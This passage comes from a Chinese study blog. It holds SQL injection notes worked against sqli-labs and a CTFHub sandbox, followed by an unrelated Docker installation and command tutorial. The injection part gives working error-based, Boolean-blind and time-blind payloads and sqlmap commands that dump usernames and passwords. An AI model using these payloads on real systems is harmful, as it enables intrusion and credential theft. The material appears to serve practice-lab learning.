class="mysql">union select 1,group_concat(username,password),3 from users --+</code></pre><p><img src="/../image/image-20240131230324541.png" alt="image-20240131230324541"></p><p>差不多就是这样</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><img src="/../image/image-20240131232843853.png" alt="image-20240131232843853"></p><p><img src="/../image/image-20240201151543752.png" alt="image-20240201151543752"></p><p>重要的是前三个，后面不怎么见到</p><h4 id="通过extractValue-报错注入"><a href="#通过extractValue-报错注入" class="headerlink" title="通过extractValue()报错注入"></a>通过extractValue()报错注入</h4><p><img src="/../image/image-20240201152540772.png" alt="image-20240201152540772"></p><p>这是数据库words中的一个表xml，里面有个doc字段为varchar(50),再插入两个xml代码</p><pre><code class="mysql">insert into xml values(&#39;&lt;book&gt;&lt;title&gt;A bad boy how to get agirlfriend&lt;/title&gt;&lt;author&gt;&lt;initial&gt;Love&lt;/initial&gt;&lt;surname&gt;benben&lt;/surname&gt;&lt;/author&gt;&lt;/book&gt;&#39;);insert into xml values(&#39;&lt;book&gt;&lt;title&gt;how to become a bad boy&lt;/title&gt;&lt;author&gt;&lt;initial&gt;hualong&lt;/initial&gt;&lt;surname&gt;Melton&lt;/surname&gt;&lt;/author&gt;&lt;/book&gt;&#39;);</code></pre><p><img src="/../image/image-20240201153602460.png" alt="image-20240201153602460"></p><p>下面事着查询一下作者是谁，extractValue有两个参数第一个是列名，后一个是路径</p><pre><code class="mysql">select extractValue(doc,&#39;/book/author/surname&#39;) from xml;</code></pre><p><img src="/../image/image-20240201154031658.png" alt="image-20240201154031658"></p><p>查书名</p><pre><code class="mysql">select extractValue(doc,&#39;/book/title&#39;) from xml;</code></pre><p><img src="/../image/image-20240201154118824.png" alt="image-20240201154118824"></p><p>下面来看看报错，你目录里面错了几个字母，他只是找不到东西，而添加了其它符号，他就会返回错误信息，比如在前面加上~</p><p><img src="/../image/image-20240201154805130.png" alt="image-20240201154805130"></p><p>所以，在报错之前，让报错回显我们想要的信息，比如库名</p><pre><code class="mysql">select extractValue(doc,concat(0x7e,(select database()))) from xml;</code></pre><p><img src="/../image/image-20240201155248760.png" alt="image-20240201155248760"></p><p>拿Less-5试试</p><pre><code class="mysql">union select 1,extractvalue(1,concat(0x7e,(select database()))),3 --+</code></pre><p><img src="/../image/image-20240201160031944.png" alt="image-20240201160031944"></p><p>id&#x3D;100’ and 1&#x3D;extractvalue(1,concat(0x7e,(select database())))–+，这种写法也可以，因为是报错回显，所以不用在意回显位置</p><p>要查表名的，则把databas()这个函数换掉即可</p><pre><code class="mysql">extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p><img src="/../image/image-20240201162001229.png" alt="image-20240201162001229"></p><p>再获取users里的列名</p><pre><code class="mysql">extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))) --+</code></pre><p><img src="/../image/image-20240201162234530.png" alt="image-20240201162234530"></p><p>再获取列里需要的具体数据</p><pre><code class="mysql">extractvalue(1,concat(0x7e,(select group_concat(username,&#39;~&#39;,password) from users))) --+</code></pre><p><img src="/../image/image-20240201162428529.png" alt="image-20240201162428529"></p><p>但数据不全，因为默认只能返回32个字节，所以可以在外面套个substring函数</p><pre><code class="mysql">extractvalue(1,concat(0x7e,(select substring(group_concat(username,&#39;~&#39;,password),25,30) from users))) --+</code></pre><p>表示从25往后再显示30个字符</p><p><img src="/../image/image-20240201162621595.png" alt="image-20240201162621595"></p><h4 id="uptatexml函数"><a href="#uptatexml函数" class="headerlink" title="uptatexml函数"></a>uptatexml函数</h4><p><img src="/../image/image-20240201162929770.png" alt="image-20240201162929770"></p><p>这个函数是三个参数的，原理和前面一样，也是把路径那个参数更改，第三个参数随便输个‘1’就行，下面拿Less-4来，这个是双引号+括号闭合的，先查查库名</p><pre><code class="mysql">&quot;...?id=1&quot;) and 1=extractvalue(1,concat(0x7e,(select database()))) --+</code></pre><p>查完库名再查表名,注意一下括号匹配</p><pre><code class="mysql">updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) --+</code></pre><p><img src="/../image/image-20240201170838879.png" alt="image-20240201170838879"></p><p>查完表名查列名</p><pre><code class="mysql">updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database())),3) --+</code></pre><p><img src="/../image/image-20240201171212580.png" alt="image-20240201171212580"></p><p>再查内容</p><pre><code class="mysql">updatexml(1,concat(0x7e,(select group_concat(username,&#39;~&#39;,password) from users)),3) --+</code></pre><p><img src="/../image/image-20240201171319765.png" alt="image-20240201171319765"></p><p>一样是32个字节，需要用substring来慢慢看</p><h4 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h4><p><img src="/../image/image-20240201172417362.png" alt="image-20240201172417362"></p><p>rand()默认是0-1</p><p><img src="/../image/image-20240201172638092.png" alt="image-20240201172638092"></p><p>rand()*2则是生成0-2的随机数，如果在后面加上表，则表中有多少行rand就执行多少次</p><p><img src="/../image/image-20240201173129418.png" alt="image-20240201173129418"></p><p>floor()向下取整，如果是rand()*2则是1或0</p><p><img src="/../image/image-20240201172711522.png" alt="image-20240201172711522"></p><p>ceiling()向上取整，和floor类似</p><p><img src="/../image/image-20240201172754797.png" alt="image-20240201172754797"></p><p>concat_ws()将第2，3两个参数用第一个参数连接起来，可以通过修改参数获得需要的信息</p><p><img src="/../image/image-20240201172851655.png" alt="image-20240201172851655"></p><pre><code class="mysql">--库名select concat_ws(&#39;~&#39;,1,(select database()));</code></pre><p><img src="/../image/image-20240201173544763.png" alt="image-20240201173544763"></p><p>还可以把1换成floor(rand()*2),方便后续统计数量</p><p>group by</p><pre><code class="mysql"> select concat_ws(&#39;~&#39;,floor(rand()*2),(select database())) as ben from users group by ben;</code></pre><p><img src="/../image/image-20240201181152735.png" alt="image-20240201181152735"></p><p>count()统计数量</p><pre><code class="mysql"> select count(*),concat_ws(&#39;~&#39;,floor(rand()*2),(select database())) as ben from users group by ben;</code></pre><p><img src="/../image/image-20240201183140877.png" alt="image-20240201183140877"></p><p>数字会变化，但和不会，这个要全0全1</p><p><img src="/../image/image-20240201183215704.png" alt="image-20240201183215704"></p><p><img src="/../image/image-20240201183240343.png" alt="image-20240201183240343"></p><p><img src="/../image/image-20240201194213286.png" alt="image-20240201194213286"></p><p>在里面的数字，应该是随机数种子，确定后就不会变了，0是会报错的，有些又不会，就用0把</p><p><img src="/../image/image-20240201195528155.png" alt="image-20240201195528155"></p><p><img src="/../image/image-20240201200009652.png" alt="image-20240201200009652"></p><p>往group_key写入数据时要重新进行计算，所以可能会导致重复</p><p>接下来试一试，基本就是把concat_ws的参数换成之前的代码，下面来看看表名，同样注意括号匹配,<strong>只要改concat_ws的参数即可，其它不用动</strong></p><pre><code class="mysql">union select 1,count(*),concat_ws(&#39;-&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as a from information_schema.tables group by a;--+</code></pre><p>还是挺长的<img src="/../image/image-20240201201242950.png" alt="image-20240201201242950"></p><p>最终也是获得了表名，下面来获取列名，同样的操作，替换语句即可</p><pre><code class="mysql">union select 1,count(*),concat_ws(&#39;-&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),floor(rand(0)*2)) as a from information_schema.columns group by a; --+</code></pre><p><img src="/../image/image-20240201201455769.png" alt="image-20240201201455769"></p><p>下面查找字段</p><pre><code class="mysql">union select 1,count(*),concat_ws(&#39;-&#39;,(select group_concat(username,&#39;-&#39;,password) from users),floor(rand(0)*2)) as a from information_schema.tables group by a--+</code></pre><p><img src="/../image/image-20240201202207721.png" alt="image-20240201202207721"></p><p>没显示。。。，去掉group试试</p><pre><code class="mysql">union select 1,count(*),concat_ws(&#39;-&#39;,(select concat(username,&#39;-&#39;,password) from users),floor(rand(0)*2)) as a from information_schema.tables group by a--+</code></pre><p><img src="/../image/image-20240201202329552.png" alt="image-20240201202329552"></p><p>加个限制一下,注意limit0,1指从0开始显示第1行，然后得加在修改得地方，其他地方不动，也可以用where id&#x3D;1，但有时候不一定又id这列，所以还是用第一种把</p><pre><code class="mysql">union select 1,count(*),concat_ws(&#39;-&#39;,(select concat(username,&#39;-&#39;,password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a --+</code></pre><p><img src="/../image/image-20240201202511088.png" alt="image-20240201202511088"></p><p>但这个一行最多也是64个字节，如果太多可以加上substring，当然也是夹在修改得地方</p><pre><code class="mysql">union select 1,count(*),concat_ws(&#39;-&#39;,substring((select concat(username,&#39;-&#39;,password) from users limit 0,1),2,4),floor(rand(0)*2)) as a from information_schema.tables group by a --+</code></pre><p><img src="/../image/image-20240201202819263.png" alt="image-20240201202819263"></p><p>从第二个字符开始，显示4个字符</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><img src="/../image/image-20240201203121868.png" alt="image-20240201203121868"></p><p><img src="/../image/image-20240201203311487.png" alt="image-20240201203311487"></p><p><strong>关键函数：ascii()</strong></p><p><img src="/../image/image-20240201203546134.png" alt="image-20240201203546134"></p><p>注意数字可以不带引号，字符需要加引号，字符串只显示第一个字符，所以我们需要用到substr函数，substr((),1,1)从第一个字符开始显示一个字符</p><pre><code class="mysql">ascii(substr((select database()),1,1))&gt;=130--+</code></pre><p>就是根据数据库名各个字符的ascii值，通过用范围逼近确定是哪个字母，一位一位确定，是不是呢，则通过页面返回的状态来确定，传真和传假的页面是不同的，可以先确定一下。感觉好麻烦，还是用sqlmao把</p><p>然后要查表名的话就是替换select database()即可</p><pre><code class="mysql">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100</code></pre><p><img src="/../image/image-20240201230553330.png" alt="image-20240201230553330"></p><p>这里就不要group了，一张表一张表确定比较合理。所以加上limit 0，1。下限确定，再确定上限</p><pre><code class="mysql">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;106 --+</code></pre><p><img src="/../image/image-20240201230856011.png" alt="image-20240201230856011"></p><p>因为知道是e，所以直接试试&#x3D;把。。。</p><pre><code class="mysql">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+</code></pre><p><img src="/../image/image-20240201231128541.png" alt="image-20240201231128541"></p><p><img src="/../image/image-20240201231213126.png" alt="image-20240201231213126"></p><p>补充sqlmap</p><p>查库</p><pre><code>python sqlmap.py -u &quot;http://challenge-697209b99487bc8f.sandbox.ctfhub.com:10800?id=1&quot; --dbs  --batch</code></pre><p><img src="/../image/image-20240301225101809.png" alt="image-20240301225101809"></p><p>查表</p><pre><code>python sqlmap.py -u &quot;http://challenge-697209b99487bc8f.sandbox.ctfhub.com:10800?id=1&quot; -D sqli --tables  --batch</code></pre><p><img src="/../image/image-20240301225207030.png" alt="image-20240301225207030"></p><p>查列</p><pre><code>python sqlmap.py -u &quot;http://challenge-697209b99487bc8f.sandbox.ctfhub.com:10800?id=1&quot; -D sqli -T flag --columns  --batch</code></pre><p><img src="/../image/image-20240301232736773.png" alt="image-20240301232736773"></p><p>查字段</p><pre><code>python sqlmap.py -u &quot;http://challenge-697209b99487bc8f.sandbox.ctfhub.com:10800?id=1&quot; -D sqli -T flag -C flag --dump  --batch</code></pre><p><img src="/../image/image-20240301232805702.png" alt="image-20240301232805702"></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p><strong>关键函数：sleep 、if(condition,true,false)</strong></p><p>sleep挺多少秒，后面的if结合上一起看,就是前面的条件为真执行第二个函数，为假则执行最后一个，可以把sleep放在里面</p><pre><code class="mysql">select if(2&gt;1,sleep(3),sleep(2));</code></pre><p>使用方式：</p><pre><code class="mysql">select if(ascii(substr((select database())&gt;100,1,1),sleep(0),sleep(3)) --+</code></pre><p>注入时建议先写参数</p><pre><code class="mysql">f(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3)) --+</code></pre><p>慢慢查库名，这里直接用&#x3D;了</p><pre><code class="mysql"> if(ascii(substr((select database()),1,1))=115,sleep(0),sleep(3))</code></pre><p>可以看到页面很快就刷新了。表名和列名则替换substr的第一个参数即可，和之前一样,记得加上 limit 0,1</p><pre><code class="mysql">if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(0),sleep(3))--+</code></pre><p>查列名</p><pre><code class="mysql">if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1),1,1))=105,sleep(0),sleep(3))--+</code></pre><p>查字段</p><pre><code class="mysql">if(ascii(substr((select username from users limit 0,1),1,1))=105,sleep(0),sleep(3))--+</code></pre><p><img src="/../image/image-20240202171741470.png" alt="image-20240202171741470"></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><img src="/../image/image-20240202173217774.png" alt="image-20240202173217774"></p><pre><code class="mysql">show variable like &#39;%secure%&#39;;</code></pre><p><img src="/../image/image-20240202173059912.png" alt="image-20240202173059912"></p><p>null时不行，空着是都可以</p><p>这里拿Less-7来练习</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker</title>
      <link href="/2024/03/02/docker/"/>
      <url>/2024/03/02/docker/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>Hypervisor允许多个操作系统共享一个CPU(多核CPU的情况可以是多个CPU)。处于操作系统与硬件系统之间，用于实现多个虚拟机共享宿主机的硬件系统。</p><p>hyper-v则是微软提供的商业化Hypervisor，运行在windows系统上</p><p>KVM与Xen是linux系统上开源的Hypervisor</p><p>现在的Windows系统的架构（操作系统和应用层分别是两个虚拟机，位于Hyper-V之上）</p><p><img src="/../image/image-20240229202902295.png" alt="image-20240229202902295"></p><p>容器与虚拟机的最大区别是</p><p>虚拟机中存在独立的硬件系统与操作系统，但容器中的全部是共享的宿主机中的操作系统与硬件系统。</p><p>VMware Workstation 要等到15.5.5版本开始，才对VMM虚拟机技术进行了重构，之前需要直接调用CPU的虚拟化功能，现在调用Win10系统的WHP（Windows 的Hypervisor平台）的API，解决了VMware Workstation与Hyper-V的不兼容问题。</p><h2 id="Docker的架构图"><a href="#Docker的架构图" class="headerlink" title="Docker的架构图"></a>Docker的架构图</h2><p><img src="https://docs.docker.com/get-started/images/docker-architecture.webp" alt="Docker Architecture diagram"></p><p>Docker使用客户机-服务器架构。Docker客户端与Docker守护进程通信，后者完成构建、运行和分发Docker容器的繁重工作。Docker客户端和守护进程可以运行在同一个系统上，或者您可以将Docker客户端连接到远程Docker守护进程。Docker客户端和守护进程使用REST API，通过UNIX套接字或网络接口进行通信。另一个Docker客户端是Docker Compose，它允许你处理由一组容器组成的应用程序。</p><h2 id="Centos安装Doker"><a href="#Centos安装Doker" class="headerlink" title="Centos安装Doker"></a>Centos安装Doker</h2><p><a href="https://blog.csdn.net/weixin_41394654/article/details/123442460">CentOS7安装jdk</a></p><p>查看防火墙状态</p><pre><code>systemctl status firewalld</code></pre><p>开启的话要关闭，然后可以做一个有基本命令和功能的基础虚拟机，然后用VM克隆。</p><p>centos的网卡文件</p><pre><code>/etc/sysconfig/network-script/ifcfg-ens33</code></pre><p>配置完可以加到hosts文件，之后用MobaXterm连接可以直接用名字，解析更方便，不加也没关系</p><img src="../image/image-20240229221236567.png" alt="image-20240229221236567" style="zoom:67%;" /><p>下面安装仓库repository</p><pre><code>$ sudo yum install -y yum-utils$ sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</code></pre><p>用阿里云的镜像地址</p><pre><code>yum-config-manager --add-repo     http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo ​</code></pre><p>看下yun的仓库文件下有没有Docker</p><pre><code>ll /etc/yum.repos.d</code></pre><p>安装Docker Engine</p><pre><code>sudo yum - y install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</code></pre><p>加个-y用来同意，省的输入,下面这个可以用来看版本，挑想要的装</p><pre><code> sudo yum list docker-ce --showduplicates | sort -r</code></pre><p>安装的时候把version string换成想要的即可</p><pre><code>sudo yum install docker-ce- &lt;VERSION STRING&gt; docker-ce-cli- &lt;VERSION_ STRING》 containerd.io docker-compose-plugin​</code></pre><p>安装后</p><pre><code>sudo systemctl start docker</code></pre><p>这一步记得在root权限执行，不然容易出问题</p><p><img src="/../image/image-20240229232953166.png" alt="image-20240229232953166"></p><p>然后,看一下自己有什么镜像</p><pre><code>docker images</code></pre><p>然后可以试一下hello world</p><pre><code>sudo docker run hello-world</code></pre><p><img src="/../image/image-20240229233235488.png" alt="image-20240229233235488"></p><p>因为没有这个镜像，一般会去下载默认的最新的这个镜像，没加tags默认就是leatest，然后latest：后面的那个就是拉取来源，hello到之后的内容就是镜像的结果，然后可以再看一下你的库里有什么</p><p><img src="/../image/image-20240229233440257.png" alt="image-20240229233440257"></p><p>可以发现多了个hello-world的镜像，然后上面有相应的信息</p><p>再来查看一下状态</p><pre><code>systemctl status docker</code></pre><p><img src="/../image/image-20240301143347091.png" alt="image-20240301143347091"></p><p>这个disable说明这个不是自启动的，我们可以通过</p><pre><code>systemctl enable docker</code></pre><p>来让他自启动</p><p><img src="/../image/image-20240301143544195.png" alt="image-20240301143544195"></p><p>练习的时候就不用自启动了</p><pre><code>systemctl disable docekr</code></pre><p>docker的关闭,关闭虚拟机时可以先关闭docker</p><pre><code>systemctl stop docker</code></pre><h2 id="配置国内加速器官方教程"><a href="#配置国内加速器官方教程" class="headerlink" title="配置国内加速器官方教程"></a>配置国内加速器<a href="https://developer.aliyun.com/article/886423?accounttraceid=73363bc7579a4e34963fee55e20ac1b2rtpf">官方教程</a></h2><p>先登陆阿里云加速器的网站，然后进入镜像加速器的页面</p><pre><code>https://cr.console.aliyun.com/cn-hangzhou/mirrors</code></pre><p>在etc文件下创建一个docker目录</p><pre><code>sudo mkdir -p /etc/docker</code></pre><p>然后用tee命令把东西输入到daemon.json文件，这个文件是新建的</p><pre><code>tee /etc/docker/dameon.json &lt;&lt;-&#39;EOF&#39;</code></pre><p>tee命令可以创建一个文件，然后你输入一个东西他会写进去并回显你输入的东西</p><pre><code>[root@localhost ~]# tee hello.loghellohellohello 1hello 1hello 2hello 2^C[root@localhost ~]# cat hello.loghellohello 1hello 2</code></pre><p>具体内容</p><pre><code>[root@localhost ~]# tee /etc/docker/dameon.json &lt;&lt;-&#39;EOF&#39;&gt; &#123;&gt; &quot;registry-mirrors&quot;: [&quot;https://9e15pjnb.mirror.aliyuncs.com&quot;]&gt; &#125;&gt; EOF&#123;&quot;registry-mirrors&quot;: [&quot;https://9e15pjnb.mirror.aliyuncs.com&quot;]&#125;[root@localhost ~]# cat /etc/docker/dameon.json&#123;&quot;registry-mirrors&quot;: [&quot;https://9e15pjnb.mirror.aliyuncs.com&quot;]&#125;[                  root@localhost ~]#</code></pre><p>然后重新加载一下配置和重启一下docker</p><pre><code class="consle">sudo systemctl daemon-reloadsudo systemctl restart docker</code></pre><p>拉一个centos：7的镜像试试,感觉还是挺慢的</p><pre><code class="console">[root@localhost ~]# docker pull centos:77: Pulling from library/centos2d473b07cdd5: Pull completeDigest: sha256:be65f488b7764ad3638f236b7b515b3678369a5124c47b8d32916d6487418ea4Status: Downloaded newer image for centos:7docker.io/library/centos:7</code></pre><h2 id="Docker引擎的卸载"><a href="#Docker引擎的卸载" class="headerlink" title="Docker引擎的卸载"></a>Docker引擎的卸载</h2><ol><li><p>Uninstall the Docker Engine, CLI, containerd, and Docker Compose packages:</p><pre><code class="console">$ sudo yum remove docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin docker-ce-rootless-extras</code></pre></li><li><p>Images, containers, volumes, or custom configuration files on your host aren’t automatically removed. To delete all images, containers, and volumes:</p><pre><code class="console">$ sudo rm -rf /var/lib/docker$ sudo rm -rf /var/lib/containerd</code></pre></li></ol><p>3.还有一些自己创建的配置文件</p><h2 id="Docker发展"><a href="#Docker发展" class="headerlink" title="Docker发展"></a>Docker发展</h2><p>首发架构由两大核心组件构成: LXC(Linux Container) 与Docker Daemon。<br>首发架构的两大问题:</p><p>严重依赖于LXC，出现了“卡脖子”问题，及无法实现Docker跨平台。所以在0.9版本使用了Docker自研的Libcontainer替换了LxC。</p><p>Docker Daemon中的“大而全”使得版本更新难、性能出现瓶颈、不符合软件哲学(由Unix团队提出)，关键是，其还存在着“中心化”问题。所以在1.1版本中其实现了OCI规范，将容器运行时Runc从Docker Daemon中剥离出来。</p><h3 id="Docker引擎架构"><a href="#Docker引擎架构" class="headerlink" title="Docker引擎架构"></a>Docker引擎架构</h3><p><img src="/../image/image-20240301161001288.png" alt="image-20240301161001288"></p><ul><li>Docker Client：用户提交Docker命令。</li><li>Docked：负责REST API、处理镜像相关命令、网络、容器编排等。</li><li>Containerd：负责容器生命周期的管理，负责处理容器相关的命令，但不负责创建容器，当docker un命令的到来时会fork出Runc和Shim两个进程</li><li>Runc：负责创建容器进程，容器创建并启动后，将容器进程交给Shim处理，然后自己推出。</li><li>Shim：负责将容器与Docker Daemon进行解耦</li></ul><h3 id="Docker引擎分类"><a href="#Docker引擎分类" class="headerlink" title="Docker引擎分类"></a>Docker引擎分类</h3><p> Docker三大版本（Moby、CE、EE），两个小版本(edge月、stable季)</p><h2 id="镜像基础"><a href="#镜像基础" class="headerlink" title="镜像基础"></a>镜像基础</h2><h3 id="镜像简介"><a href="#镜像简介" class="headerlink" title="镜像简介"></a>镜像简介</h3><p>镜像是一种轻量级、可执行的独立软件包，也可以说是一个精简的操作系统。镜像中包含应用软件及应用软件的运行环境。具体来说镜像包含运行某个软件所需的所有内容，包括代码、库、环境变量和配置文件等。几乎所有应用，直接打包为 Docker 镜像后就可以运行。由于镜像的运行时是容器，容器的设计初衷就是快速和小巧，所以镜像通常都比较小，镜像中不包含内核，其共享宿主机的内核:镜像中只包含简单的 Shell，或没有 Shell。</p><p>busybox一个大的工具箱，集成了很多有用的linux命令工具等，堪称linux的瑞士军刀，下载一下</p><pre><code>docker pull busyboxUsing default tag: latestlatest: Pulling from library/busybox9ad63333ebc9: Pull completeDigest: sha256:6d9ac9237a84afe1516540f40a0fafdc86859b2141954b4d643af7066d598b74Status: Downloaded newer image for busybox:latestdocker.io/library/busybox:latest</code></pre><p>很小，就是一个微型的系统</p><h3 id="仓库分类"><a href="#仓库分类" class="headerlink" title="仓库分类"></a>仓库分类</h3><ul><li><p>Docker Official Image</p><p>Docker 官方镜像仓库。该类仓库中的镜像由 Docker 官方构建发布，代码质量较高且安全，有较完善的文档。该类仓库中的镜像会及时更新。一般常用的系统、工具软件、中间件都有相应的官方镜像仓库。例如，Zookeeper、Redis、Nginx 等。官方镜像仓库的名称<repository>一般直接为该类软件的名称<software-name>。“</p></li><li><p>Verified Publisher</p><p>已验证发布者仓库。该类仓库中的镜像由非 Docker 官方的第三方发布。但该第三方是由 Docker 公司审核认证过的，一般为大型企业、团体或组织。审核通过后，Docker 公司会向其颁发“VERIFIED PUBLISHER”标识。这种仓库中镜像的质量还有有保证的。除了官方镜像仓库，其它都是非官方镜像仓库。非官方镜像仓库名称<repository>一般由发布者用户名与软件名称两部分构成，形式为: <username>&#x2F;<software-name></p></li><li><p>Sponsored OSS</p><p>由 Docker 公司赞助开发的镜像仓库。该类仓库中的镜像也由非 Docker 官方的第三方发布，但该镜像的开发是由 Docker 公司赞助的。该类型的第三方一般为个人、团队或组织。这种仓库中镜像的质量也是有保证的。“</p></li><li><p>无认证</p></li></ul><p>​不安全</p><ul><li><p>第三方镜像中心</p><p>镜像中心默认使用的都是 Docker 官方的 Docker Hub。不过，镜像中心是可配置的，可以使用指定的第三方镜像中心。对于第三方镜像中心中的仓库名称<repository>由三部分构成:<domain-name>&#x2F;<username>&#x2F;<software-name>。其中的<domain-name>指的是第三方镜像中心的域名或IP。</p></li></ul><h3 id="镜像定位"><a href="#镜像定位" class="headerlink" title="镜像定位"></a>镜像定位</h3><p>对于任何镜像，都可通过<repository>:<tag>进行唯一定位。其中<tag>一般称为镜像的版本号。<tag>中有一个比较特殊的版本一-latest。如果不指定，默认<tag>即为 latest。不过，虽然其字面意思是最新版，一般其也的确存放的是最新版,但并不能保证其真的就是最新版。</p><h2 id="获取帮助信息"><a href="#获取帮助信息" class="headerlink" title="获取帮助信息"></a>获取帮助信息</h2><ol><li>官网获取<a href="https://docs.docker.com/reference/cli/docker/">https://docs.docker.com/reference/cli/docker/</a></li><li>docker –help</li></ol><pre><code>docker version --help</code></pre><h2 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h2><pre><code>[root@localhost ~]# docker pull --help​Usage:  docker pull [OPTIONS] NAME[:TAG|@DIGEST]--DIGEST摘要，镜像内容的哈希值，用来验证内容是否被篡改，和TAG同作用，但TAG更方便​Download an image from a registry --拉取一个仓库​Aliases:  docker image pull, docker pull​Options:  -a, --all-tags                Download all tagged images in the repository --下载一个仓库的所有镜像，可能会下载很多东西      --disable-content-trust   Skip image verification (default true) --跳过镜像的验证，默认是跳过的，下第三方的时候最好设置成false      --platform string         Set platform if server is multi-platform --拉去指定架构的镜像，不常用，一般都是和自身架构匹配的                                capable  -q, --quiet                   Suppress verbose output --省略下载的输出信息，减少信息冗余</code></pre><h2 id="docker-images"><a href="#docker-images" class="headerlink" title="docker images"></a>docker images</h2><pre><code>[root@localhost ~]# docker images --help​Usage:  docker images [OPTIONS] [REPOSITORY[:TAG]]​List images​Aliases:  docker image ls, docker image list, docker images​Options:  -a, --all             Show all images (default hides intermediate images)      --digests         Show digests  -f, --filter filter   Filter output based on conditions provided      --format string   Format output using a custom template:                        &#39;table&#39;:            Print output in table format                        with column headers (default)                        &#39;table TEMPLATE&#39;:   Print output in table format                        using the given Go template                        &#39;json&#39;:             Print in JSON format                        &#39;TEMPLATE&#39;:         Print output using the given                        Go template.                        Refer to https://docs.docker.com/go/formatting/                        for more information about formatting output with                        templates      --no-trunc        Don&#39;t truncate output  -q, --quiet           Only show image IDs​</code></pre><p>– digests可以查看镜像的摘要</p><pre><code>[root@localhost ~]# docker images --digestsREPOSITORY    TAG       DIGEST                                                                    IMAGE ID       CREATED         SIZEbusybox       latest    sha256:6d9ac9237a84afe1516540f40a0fafdc86859b2141954b4d643af7066d598b74   3f57d9401f8d   6 weeks ago     4.26MBhello-world   latest    sha256:d000bc569937abbe195e20322a0bde6b2922d805332fd6d8a68b19f524b7d21d   d2c94e258dcb   10 months ago   13.3kBcentos        7         sha256:be65f488b7764ad3638f236b7b515b3678369a5124c47b8d32916d6487418ea4   eeb6ee3f44bd   2 years ago     204MB​</code></pre><p>–no-trunc,写全信息</p><pre><code>[root@localhost ~]# docker images --no-truncREPOSITORY    TAG       IMAGE ID                                                                  CREATED         SIZEbusybox       latest    sha256:3f57d9401f8d42f986df300f0c69192fc41da28ccc8d797829467780db3dd741   6 weeks ago     4.26MBhello-world   latest    sha256:d2c94e258dcb3c5ac2798d32e1249e42ef01cba4841c2234249495f87264ac5a   10 months ago   13.3kBcentos        7         sha256:eeb6ee3f44bd0b5103bb561b4c16bcb82328cfe5809ab675bb17ab3a16c517c9   2 years ago     204MB</code></pre><p>-q是显示简略信息</p><pre><code>[root@localhost ~]# docker images -q3f57d9401f8dd2c94e258dcbeeb6ee3f44bd</code></pre><p>docker rmi  $(docker images -q)删除所有镜像</p><p>但遇到一个问题”Error response from daemon: invalid reference format: repository name must be lowercase”但这个好像是要小写命名docker镜像</p><p>这个好像要重命名才能解决</p><p>docker images 镜像名字，单独查看那个镜像的信息</p><p>-f 过滤</p><pre><code>docker images -f dangling=true --悬虚镜像：悬虚镜像就是镜像没有仓库名或没有标签查询显示虚悬镜像，在列表中展示为 &lt;none&gt;:&lt;none&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/20200412145250562.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-D5avIWwl-1586674340510)(evernotecid://621D2FF6-4E72-4E02-9043-55F31F42819B/appyinxiangcom/22553815/ENResource/p1118)]"></p><pre><code>[root@localhost ~]# docker images -f since=hello-worldREPOSITORY   TAG       IMAGE ID       CREATED       SIZEbusybox      latest    3f57d9401f8d   6 weeks ago   4.26MB</code></pre><p>since这个是看自since之后的东西，也可以用before看之前的</p><p>reference&#x3D; * : * 宽泛查询，*</p><pre><code>docker images -f reference=*:latest找所有latest版本的镜像docker images -f refernece=centos:*找所有版本的centosdocker images -f reference=*t*找到名字和版本中包含字母t的镜像但reference只查官方的</code></pre><p>–format 格式化输出</p><pre><code>[root@localhost ~]# docker images --format &#123;&#123;.Repository&#125;&#125;busyboxhello-worldcentos[root@localhost ~]# docker images --format &#123;&#123;.Repository&#125;&#125;:&#123;&#123;.Tag&#125;&#125;busybox:latesthello-world:latestcentos:7</code></pre><h2 id="docker-search"><a href="#docker-search" class="headerlink" title="docker search"></a>docker search</h2><pre><code>[root@localhost ~]# docker search centosNAME                               DESCRIPTION                                                                                                                   STARS     OFFICIALcentos                             DEPRECATED; The official build of CentOS.                                                                                     7715      [OK]kasmweb/centos-7-desktop           CentOS 7 desktop for Kasm Workspaces                                                                                          43...​</code></pre><p>AUTOMATED表示当前镜像是否是”自动化镜像“，就是使用Docker Hub连接一个包含Dockerfile文件（专门构建镜像用的文件）的GitHub仓库或Bitbucket仓库（源码托管平台），然后Docker Hub就会自动根据Dockerfile内容构建镜像，这种构建出的镜像就会带AUTOMATED，这种构建镜像的方式称为Trusted Build（受信构建）。只要Dockerfile文件内容发生变化，那么Docker 